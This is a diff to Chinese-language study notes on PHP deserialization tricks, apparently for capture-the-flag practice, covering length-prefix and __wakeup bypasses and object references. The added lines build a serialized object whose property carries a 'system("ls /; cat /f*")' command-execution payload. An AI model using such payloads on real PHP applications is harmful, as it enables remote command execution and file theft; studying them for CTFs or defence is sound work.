@@ -17,6 +17,13 @@
 - `O:1:"A":1:`也可以用`O:+1:"A":1:`和`O:1:"A":+1:`代替
 - 对象内可以用指针：`R:2;`指向第二个元素
   id:: 6478aaed-0cfc-41e3-a12e-55de79af3104
+	- 可以这样构造
+		- ```php
+		  $t = new test;
+		  $t -> c = "system(\"ls /; cat /f*\");";
+		  $t -> a = & $t -> b;
+		  $s = serialize($t);
+		  ```
 - `__wakeup`绕过：修改类的键数量
   collapsed:: true
 	- ```php
